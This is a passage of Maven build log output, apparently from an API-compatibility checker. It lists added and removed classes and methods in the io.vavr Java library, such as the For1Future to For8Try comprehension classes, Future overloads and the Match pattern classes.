For(io.vavr.control.Try,io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For2Try\n[INFO]          + method For(io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For3Try\n[INFO]          + method For(io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For4Try\n[INFO]          + method For(io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For5Try\n[INFO]          + method For(io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For6Try\n[INFO]          + method For(io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For7Try\n[INFO]          + method For(io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try,io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For8Try\n[INFO]          + method Future(java.util.concurrent.Executor,io.vavr.CheckedFunction0)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          + method Future(java.util.concurrent.Executor,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method Future(java.util.concurrent.ExecutorService,io.vavr.CheckedFunction0)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          - method Future(java.util.concurrent.ExecutorService,java.lang.Object)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]      + class io.vavr.API$For1Future\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield()\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          + method yield(java.util.function.Function)\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]      + class io.vavr.API$For1List\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield()\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method yield(java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + class io.vavr.API$For1Option\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield()\n[INFO]              + return io.vavr.control.Option\n[INFO]          + method yield(java.util.function.Function)\n[INFO]              + return io.vavr.control.Option\n[INFO]      + class io.vavr.API$For1Try\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield()\n[INFO]              + return io.vavr.control.Try\n[INFO]          + method yield(java.util.function.Function)\n[INFO]              + return io.vavr.control.Try\n[INFO]      + class io.vavr.API$For2Future\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(java.util.function.BiFunction)\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]      + class io.vavr.API$For2List\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(java.util.function.BiFunction)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + class io.vavr.API$For2Option\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(java.util.function.BiFunction)\n[INFO]              + return io.vavr.control.Option\n[INFO]      + class io.vavr.API$For2Try\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(java.util.function.BiFunction)\n[INFO]              + return io.vavr.control.Try\n[INFO]      + class io.vavr.API$For3Future\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function3)\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]      + class io.vavr.API$For3List\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function3)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + class io.vavr.API$For3Option\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function3)\n[INFO]              + return io.vavr.control.Option\n[INFO]      + class io.vavr.API$For3Try\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function3)\n[INFO]              + return io.vavr.control.Try\n[INFO]      + class io.vavr.API$For4Future\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function4)\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]      + class io.vavr.API$For4List\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function4)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + class io.vavr.API$For4Option\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function4)\n[INFO]              + return io.vavr.control.Option\n[INFO]      + class io.vavr.API$For4Try\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function4)\n[INFO]              + return io.vavr.control.Try\n[INFO]      + class io.vavr.API$For5Future\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function5)\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]      + class io.vavr.API$For5List\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function5)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + class io.vavr.API$For5Option\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function5)\n[INFO]              + return io.vavr.control.Option\n[INFO]      + class io.vavr.API$For5Try\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function5)\n[INFO]              + return io.vavr.control.Try\n[INFO]      + class io.vavr.API$For6Future\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function6)\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]      + class io.vavr.API$For6List\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function6)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + class io.vavr.API$For6Option\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function6)\n[INFO]              + return io.vavr.control.Option\n[INFO]      + class io.vavr.API$For6Try\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function6)\n[INFO]              + return io.vavr.control.Try\n[INFO]      + class io.vavr.API$For7Future\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function7)\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]      + class io.vavr.API$For7List\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function7)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + class io.vavr.API$For7Option\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function7)\n[INFO]              + return io.vavr.control.Option\n[INFO]      + class io.vavr.API$For7Try\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function7)\n[INFO]              + return io.vavr.control.Try\n[INFO]      + class io.vavr.API$For8Future\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function8)\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]      + class io.vavr.API$For8List\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function8)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + class io.vavr.API$For8Option\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function8)\n[INFO]              + return io.vavr.control.Option\n[INFO]      + class io.vavr.API$For8Try\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + annotated jdk.internal.HotSpotIntrinsicCandidate\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function8)\n[INFO]              + return io.vavr.control.Try\n[INFO]      < class io.vavr.API$Match$Pattern0\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method ()\n[INFO]              + return void\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < class io.vavr.API$Match$Pattern1\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < class io.vavr.API$Match$Pattern2\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < class io.vavr.API$Match$Pattern3\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < class io.vavr.API$Match$Pattern4\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < class io.vavr.API$Match$Pattern5\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < class io.vavr.API$Match$Pattern6\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < class io.vavr.API$Match$Pattern7\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < class io.vavr.API$Match$Pattern8\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return 